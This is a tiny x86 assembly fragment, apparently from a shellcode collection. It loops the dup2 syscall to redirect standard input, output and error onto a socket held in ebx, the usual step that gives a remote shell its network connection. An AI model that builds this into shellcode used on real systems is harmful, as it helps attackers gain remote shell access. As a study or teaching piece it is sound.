        ;; Takes socket in ebx
[BITS 32]
        %include "linux/32.asm"
        push byte 3
        pop ecx
lbl:
        dec ecx
        push byte SYS_dup2
        pop eax
        int 0x80
        jnz lbl